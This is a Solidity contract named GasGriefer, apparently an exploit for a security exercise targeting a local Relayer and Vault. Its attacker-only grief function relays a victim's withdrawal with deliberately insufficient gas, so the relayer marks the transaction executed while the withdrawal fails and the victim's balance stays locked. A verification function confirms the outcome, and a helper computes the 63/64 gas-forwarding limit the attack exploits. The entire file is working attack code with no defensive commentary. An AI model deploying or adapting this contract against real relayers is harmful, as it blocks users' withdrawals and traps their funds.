// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Vault} from "./Vault.sol";
import {Relayer} from "./Relayer.sol";

contract GasGriefer {

    Relayer public immutable relayer;
    Vault   public immutable vault;
    address public immutable attacker;
    uint256 public constant GRIEF_GAS = 10_000;

    event GriefExecuted(bytes32 indexed txHash, address indexed victim);

    constructor(address payable _relayer, address payable _vault) {
        relayer = Relayer(_relayer);
        vault   = Vault(_vault);
        attacker = msg.sender;
    }

    function grief(
        address victim,
        uint256 amount,
        bytes32 txHash
    ) external {
        require(msg.sender == attacker, "GasGriefer: not attacker");
        require(!relayer.executed(txHash), "GasGriefer: already executed");

        bytes memory data = abi.encodeWithSignature(
            "withdraw(address,uint256)",
            victim,
            amount
        );
        relayer.relay(
            address(vault),
            data,
            GRIEF_GAS,
            txHash
        );

        emit GriefExecuted(txHash, victim);
    }

    function verifyGrief(
        bytes32 txHash,
        address victim
    ) external view returns (
        bool txMarkedExecuted,
        uint256 victimBalanceStuck
    ) {
        txMarkedExecuted    = relayer.executed(txHash);
        victimBalanceStuck  = vault.balances(victim);
    }

    function calculateMaxForwardableGas(uint256 totalGas, uint256 overhead)
        external
        pure
        returns (uint256 maxForwardable)
    {
        uint256 remaining = totalGas - overhead;
        maxForwardable = remaining * 63 / 64;
    }
}